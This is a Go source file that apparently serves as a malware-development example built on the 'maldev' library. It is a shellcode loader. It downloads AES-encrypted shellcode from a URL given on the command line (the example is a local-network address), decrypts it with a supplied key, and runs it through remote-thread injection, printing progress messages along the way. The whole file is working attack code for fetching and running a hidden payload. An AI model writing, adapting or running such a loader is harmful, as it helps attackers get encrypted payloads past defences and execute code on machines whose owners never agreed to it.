package main

import (
  "log"
  "os"
  "fmt"
  "time"
  "strings"

  // Maldev packages
  "github.com/D3Ext/maldev/shellcode"
  "github.com/D3Ext/maldev/crypto"
  l "github.com/D3Ext/maldev/logging"
)

func main(){
  if len(os.Args) <= 2 { // Check provided url
    fmt.Println("Shellcode URL missing! Example: " + os.Args[0] + " http://192.168.116.146/shellcode.enc MySuperSecret32BitsLongPassword!")
    os.Exit(0)
  }

  l.ProgressBar("Retrieving encrypted shellcode from " + os.Args[1], 1500, 100)
  sc, err := shellcode.GetShellcodeFromUrl(os.Args[1]) // Use maldev internal function to get shellcode from URL
  if err != nil {
    log.Fatal(err)
  }

  iv := sc[0:16] // Get IV from encrypted shellcode which is appended at the beggining
  sc = sc[16:] // Now remove the first 16 bytes from shellcode which are the IV

  l.Good("Encrypted shellcode retrieved successfully: ")
  fmt.Println(sc)
  time.Sleep(400 * time.Millisecond)
  l.Infoln("Decrypting shellcode using provided PSK: " + strings.Repeat("*", len(os.Args[2])))

  sc, err = crypto.AESDecrypt(sc, iv, []byte(os.Args[2])) // Use maldev internal function to decrypt shellcode
  if err != nil {
    log.Fatal(err)
  }
  time.Sleep(300 * time.Millisecond)

  l.Goodln("Shellcode has been decrypted successfully!") // Some progress bars to let the user read
  l.ProgressBar("Trying to inject shellcode", 1500, 100)

  err = shellcode.CreateRemoteThread(sc) // Inject shellcode
  if err != nil {
    log.Fatal(err)
  }
  
  l.Goodln("Shellcode should have been executed!")
  time.Sleep(100 * time.Millisecond)
}

